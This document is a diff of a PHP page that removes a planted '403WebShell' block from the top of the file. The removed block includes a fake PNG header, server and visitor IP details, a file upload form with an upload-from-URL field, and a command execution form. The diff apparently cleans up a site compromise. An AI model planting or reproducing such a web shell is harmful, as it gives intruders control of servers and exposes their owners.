@@ -1,23 +1,11 @@
-PNG
-<!doctypehtml><html><head><title>403WebShell</title><meta content="noindex"name="robots"></head><body bgcolor="#1f1f1f"text="#ffffff"><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"rel="stylesheet"><style>@import url(https://fonts.googleapis.com/css?family=Dosis);@import url(https://fonts.googleapis.com/css?family=Bungee);@import url(https://fonts.googleapis.com/css?family=Russo+One);body{font-family:Consolas,cursive;text-shadow:0 0 1px #757575}body::-webkit-scrollbar{width:12px}body::-webkit-scrollbar-track{background:#1f1f1f}body::-webkit-scrollbar-thumb{background-color:#1f1f1f;border:3px solid gray}#content tr:hover{background-color:#636263;text-shadow:0 0 10px #fff}#content .first{background-color:#5e5e5e}#content .first:hover{background-color:#25383c;text-shadow:0 0 1px #757575}table{border:1px #000 dotted;table-layout:fixed}td{word-wrap:break-word}a{color:#df5;text-decoration:none}a:hover{color:#000;text-shadow:0 0 10px #fff}input,select,textarea{border:1px #000 solid;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px}.gas{background-color:#1f1f1f;color:#fff;cursor:pointer}select{background-color:transparent;color:#fff}select:after{cursor:pointer}.linka{background-color:transparent;color:#fff}.up{background-color:transparent;color:#fff}option{background-color:#1f1f1f}.btf{background:0 0;border:1px #fff solid;cursor:pointer}::-webkit-file-upload-button{background:0 0;color:#fff;border-color:#fff;cursor:pointer}</style><center><font face="Bungee" size="5">403Webshell</font></center>
-<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>Server IP : <font color=#df5>184.168.97.113</font> &nbsp;/&nbsp; Your IP : <font color=#df5>5.248.12.220</font><br>Web Server : <font color='#df5'>Apache</font><br>System : <font color='#df5'>Linux sg2plzcpnl456437.prod.sin2.secureserver.net 4.18.0-553.27.1.lve.1.el8.x86_64 #1 SMP Wed Nov 20 15:58:00 UTC 2024 x86_64</font><br>User : <font color='#df5'>fe9g2cs9gbs1&nbsp;</font>( <font color='#df5'>7974944</font>)<br>PHP Version : <font color='#df5'>8.0.30</font><br>Disable Function : <font color='#df5'>NONE</font></font><br>MySQL : <font color=red>OFF</font> &nbsp;|&nbsp; cURL : <font color=green>ON</font> &nbsp;|&nbsp; WGET : <font color=green>ON</font> &nbsp;|&nbsp; Perl : <font color=green>ON</font> &nbsp;|&nbsp; Python : <font color=green>ON</font> &nbsp;|&nbsp; Sudo : <font color=red>OFF</font> &nbsp;|&nbsp; Pkexec : <font color=red>OFF</font><br>Directory : &nbsp;<a href="?loknya=/">/</a><a href="?loknya=/home">home</a>/<a href="?loknya=/home/fe9g2cs9gbs1">fe9g2cs9gbs1</a>/<a href="?loknya=/home/fe9g2cs9gbs1/public_html">public_html</a>/</td></tr><tr><td><br>Upload File : <form enctype="multipart/form-data" method="post">
-<input type="radio" value="1" name="dirnya" checked>current_dir [ <font color='green'>Writeable</font> ]
-<input type="radio" value="2" name="dirnya" >document_root [ <font color='green'>Writeable</font> ]
-<br>
-<input type="hidden" name="upwkwk" value="aplod">
-<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://linuxploit.com/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="5" placeholder="kerang.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
-</form><br><form method="post" enctype="application/x-www-form-urlencoded">
-Command : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="">
-<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
-</form></table><br><hr><center style="font-family: Russo One">[ <a href='/center/files/image/1737141971webb.php'>Back</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<hr></center><br><?php include 'header.php';
+<?php include 'header.php';
 
 ini_set('display_startup_errors', 1);
 ini_set('display_errors', 1);
 error_reporting(-1);
 
 ?>
+
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
 <style>
